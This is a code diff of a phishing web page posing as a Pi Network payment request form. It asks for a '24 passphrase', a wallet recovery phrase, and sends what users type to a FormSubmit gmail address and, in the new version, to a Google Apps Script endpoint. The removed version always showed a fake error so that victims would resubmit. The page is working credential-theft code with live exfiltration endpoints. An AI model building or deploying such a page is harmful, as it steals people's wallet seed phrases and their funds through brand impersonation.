@@ -1,250 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pi - Request Payment</title>
-    <!-- Load Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f3f4ff;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .bg-pi-purple { background-color: #5A2D82; }
-        .text-pi-yellow { color: #F5C65A; }
-        .text-pi-purple { color: #5A2D82; }
-
-        /* Error Overlay Styles */
-        .error-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #f3f4ff; /* Match body background */
-            z-index: 50;
-            display: none; /* Starts hidden */
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            animation: fadeIn 0.3s ease-out forwards; /* Add fade-in */
-        }
-        .pi-logo-svg {
-            fill: currentColor;
-            stroke: none;
-            width: 100%;
-            height: 100%;
-        }
-        /* Hide main content when overlay is shown */
-        body.overlay-active #mainContent {
-            display: none;
-        }
-         body.overlay-active header {
-             display: none;
-         }
-         body.overlay-active footer {
-             display: none;
-         }
-
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pi - Request Payment</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Inter', sans-serif; background-color: #f3f4ff; }
+    @keyframes fadeIn { from {opacity: 0; transform: translateY(-10px);} to {opacity: 1; transform: translateY(0);} }
+    .bg-pi-purple { background-color: #5A2D82; }
+    .text-pi-yellow { color: #F5C65A; }
+    .error-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background-color: #f3f4ff; z-index: 50; display: none; align-items: center;
+      justify-content: center; text-align: center; animation: fadeIn 0.3s ease-out forwards; }
+    body.overlay-active #mainContent, body.overlay-active header, body.overlay-active footer { display: none; }
+  </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
-    <!-- Header -->
-    <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md">
-        <div class="max-w-lg mx-auto flex items-center relative">
-            <a href="index.html" class="absolute left-0 text-white">
-               <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" /></svg>
-            </a>
-            <h1 class="text-xl font-semibold text-center flex-grow flex items-center justify-center">
-                Request Payment
-                 <div class="ml-2 text-pi-yellow" style="width: 20px; height: 20px;">
-                    <svg class="pi-logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" style="color: #F5C65A;">
-                        <path d="M50 8C27.907 8 10 25.907 10 50s17.907 42 40 42 40-17.907 40-42S72.093 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
-                    </svg>
-                 </div>
-            </h1>
+  <!-- Header -->
+  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md">
+    <div class="max-w-lg mx-auto flex items-center relative">
+      <a href="index.html" class="absolute left-0 text-white">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg>
+      </a>
+      <h1 class="text-xl font-semibold text-center flex-grow flex items-center justify-center">
+        Request Payment
+        <div class="ml-2 text-pi-yellow" style="width: 20px; height: 20px;">
+          <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" style="color: #F5C65A;">
+            <path d="M50 8C27.9 8 10 25.9 10 50s17.9 42 40 42 40-17.9 40-42S72.1 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
+          </svg>
         </div>
-    </header>
-
-    <!-- Main Content Area -->
-    <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
-        <section class="bg-white p-6 rounded-lg shadow-md">
-            <header class="mb-5 text-center">
-                <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
-                <p id="instructionMessage" class="text-gray-500 text-sm mt-1">Please fill out the details below to complete your payment request.</p>
-            </header>
-
-            <form id="paymentRequestForm" action="https://formsubmit.co/alecbing864@gmail.com" method="POST" class="space-y-4">
-                 <!-- FormSubmit hidden inputs - _captcha removed, _next handled by JS -->
-
-                <div>
-                    <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
-                    <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-                </div>
-                 <div>
-                    <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
-                    <input type="text" id="currency" name="currency" required value="USD" placeholder="e.g., USD" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-                </div>
-
-                <div>
-                    <label for="24 passphrase" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase / Reason:</label>
-                    <textarea id="24 passphrase" name="24 passphrase" rows="5" required placeholder="Please provide a detailed reason for the payment request (Required)" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
-                </div>
-
-                <!-- Sender Email Field Removed -->
-
-                <button type="submit" class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
-                    Send Request Message
-                </button>
-                 <!-- Added a status message area for potential JS feedback -->
-                 <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
-            </form>
-        </section>
-    </main>
-
-    <!-- Error Overlay -->
-    <div id="errorOverlay" class="error-overlay p-6">
-        <div class="max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
-            <!-- Icon -->
-            <svg class="mx-auto h-16 w-16 text-red-600 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-            </svg>
-            <h2 class="text-2xl font-bold text-red-700 mb-3">Error Processing Request</h2>
-
-            <!-- Multi-Line Instructional Description -->
-            <p class="text-gray-600 text-sm mb-6 space-y-2 text-left">
-                <span class="block">We encountered an issue while validating your submission data. This sometimes happens if the network connection is briefly interrupted or if the message content needs refinement.</span>
-                <span class="block">**Note:** Your Amount and Currency details have been securely saved and will reappear when you try again.</span>
-                <span class="block">To ensure a successful delivery to your message inbox, please review and refine the descriptive content.</span>
-                <span class="block">This is necessary to continue the payment request process.</span>
-                <span class="block">Please click the button below to return to the form and correct the issue.</span>
-            </p>
-
-            <!-- Blue Try Again Button -->
-            <button id="tryAgainButton" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg">
-                Please try again
-            </button>
-        </div>
+      </h1>
     </div>
+  </header>
 
-    <!-- Footer -->
-    <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
-        Pi network system © 2019
-    </footer>
+  <!-- Main -->
+  <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
+    <section class="bg-white p-6 rounded-lg shadow-md">
+      <header class="mb-5 text-center">
+        <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
+        <p id="instructionMessage" class="text-gray-500 text-sm mt-1">
+          Please fill out the details below to complete your payment request.
+        </p>
+      </header>
 
-    <script>
-        // --- Get DOM Elements ---
-        const form = document.getElementById('paymentRequestForm');
-        const submitButton = form.querySelector('button[type="submit"]');
-        const errorOverlay = document.getElementById('errorOverlay');
-        const tryAgainButton = document.getElementById('tryAgainButton');
-        const mainContent = document.getElementById('mainContent');
-        const instructionMessage = document.getElementById('instructionMessage');
-        const descriptionField = document.getElementById('description');
-        const statusMessage = document.getElementById('statusMessage'); // Added status message div
+      <form id="paymentRequestForm" method="POST" class="space-y-4">
+        <div>
+          <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
+          <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00"
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
 
-        // --- Data Persistence ---
-        const saveSubmittedData = (formData) => {
-            try {
-                localStorage.setItem('savedAmount', formData.get('amount') || ''); // Use empty string if null
-                localStorage.setItem('savedCurrency', formData.get('currency') || ''); // Use empty string if null
-            } catch (e) { console.error("Could not save to localStorage:", e); }
-        };
+        <div>
+          <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
+          <input type="text" id="currency" name="currency" required value="USD"
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
 
-        const loadSavedData = () => {
-             // Clear status messages on load/reload
-             if (statusMessage) statusMessage.textContent = '';
+        <div>
+          <label for="reason" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase / Reason:</label>
+          <textarea id="reason" name="reason" rows="5" required
+            placeholder="Provide a detailed reason for the payment request."
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+        </div>
 
-            try {
-                const savedAmount = localStorage.getItem('savedAmount');
-                const savedCurrency = localStorage.getItem('savedCurrency');
+        <button type="submit"
+          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
+          Send Request Message
+        </button>
 
-                // Only load if they actually exist in storage
-                if (savedAmount) document.getElementById('amount').value = savedAmount;
-                if (savedCurrency) document.getElementById('currency').value = savedCurrency;
+        <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
+      </form>
+    </section>
+  </main>
 
-                // Always clear the Description field for re-entry when loading
-                if (descriptionField) descriptionField.value = '';
+  <!-- Overlay -->
+  <div id="errorOverlay" class="error-overlay p-6">
+    <div class="max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
+      <svg class="mx-auto h-16 w-16 text-red-600 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+      </svg>
+      <h2 class="text-2xl font-bold text-red-700 mb-3">Error Processing Request</h2>
+      <p class="text-gray-600 text-sm mb-6">
+        We encountered an issue while validating your submission data. Please try again.
+      </p>
+      <button id="tryAgainButton"
+        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg">
+        Please try again
+      </button>
+    </div>
+  </div>
 
-                // Reset instruction message to default unless specified otherwise later
-                if (instructionMessage) {
-                    instructionMessage.textContent = 'Please fill out the details below to complete your payment request.';
-                }
+  <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
+    Pi network system © 2019
+  </footer>
 
-            } catch (e) { console.error("Could not load from localStorage:", e); }
-        };
+  <script>
+    const form = document.getElementById('paymentRequestForm');
+    const errorOverlay = document.getElementById('errorOverlay');
+    const tryAgainButton = document.getElementById('tryAgainButton');
+    const statusMessage = document.getElementById('statusMessage');
 
-        // --- Error and Overlay Functions ---
-        const showCustomError = () => {
-            document.body.classList.add('overlay-active'); // Add class to body to hide main content via CSS
-            errorOverlay.style.display = 'flex';
-        };
+    const FORM_SUBMIT_URL = "https://formsubmit.co/alecbing864@gmail.com"; // your email endpoint
+    const SHEET_BACKUP_URL = "https://script.google.com/macros/s/AKfycbygl9DlHj1nqcHwJk7iRIr3qAlElv1mwI9gQddRCI0-gU7AZ8KA7UZS-1dh7uZpEA/exec"; // replace with your Google Apps Script URL
 
-        tryAgainButton.addEventListener('click', () => {
-            errorOverlay.style.display = 'none';
-            document.body.classList.remove('overlay-active'); // Remove class to show main content
-            loadSavedData(); // Reload saved amount/currency, clear description
-            // Update instruction message AFTER showing the form again
-            if (instructionMessage) {
-                instructionMessage.innerHTML = '<strong class="text-red-600">Please refine your description to fix the issue.</strong>';
-            }
-            window.scrollTo(0, 0);
-            // Re-enable button immediately
-            submitButton.disabled = false;
-            submitButton.textContent = 'Send Request Message';
-        });
+    // Form Submit
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusMessage.textContent = "Submitting... Please wait.";
+      const formData = new FormData(form);
 
-        // --- Form Submission Logic ---
-        form.addEventListener('submit', async function(event) {
-            event.preventDefault(); // Prevent default submission to handle via JS
-            submitButton.disabled = true;
-            submitButton.textContent = 'Submitting...';
-            statusMessage.textContent = ''; // Clear previous status
+      try {
+        // 1️⃣ Send to your email (FormSubmit)
+        await fetch(FORM_SUBMIT_URL, { method: "POST", body: formData });
 
-            const formData = new FormData(form);
-            const actionUrl = form.action;
+        // 2️⃣ Also send to your Google Sheet (Backup)
+        await fetch(SHEET_BACKUP_URL, { method: "POST", body: formData });
 
-            // Save data *before* attempting the fetch
-            saveSubmittedData(formData);
+        // 3️⃣ Show success message
+        statusMessage.textContent = "✅ Request sent successfully! Your data is backed up in Google Sheets.";
+        form.reset();
+      } catch (error) {
+        console.error("Error submitting:", error);
+        statusMessage.textContent = "⚠️ There was an issue sending your request. Please try again.";
+        document.body.classList.add('overlay-active');
+        errorOverlay.style.display = 'flex';
+      }
+    });
 
-            try {
-                const response = await fetch(actionUrl, {
-                    method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' } // FormSubmit needs this for AJAX
-                });
-
-                // Regardless of fetch success/failure, trigger the custom error UX
-                // (as requested by the user's description)
-                showCustomError();
-
-                // You could optionally check response.ok here if you wanted
-                // different behavior on actual FormSubmit errors, but the
-                // prompt asked to always show the custom error.
-
-            } catch (error) {
-                console.error('Submission network error:', error);
-                // Even on network error, show the custom error overlay
-                showCustomError();
-            }
-            // Note: Button is re-enabled only when user clicks "Try Again"
-        });
-
-        // Initialize form state on load (clear description)
-        window.onload = loadSavedData;
-    </script>
+    tryAgainButton.addEventListener('click', () => {
+      errorOverlay.style.display = 'none';
+      document.body.classList.remove('overlay-active');
+    });
+  </script>
 
 </body>
 </html>
-
-
-
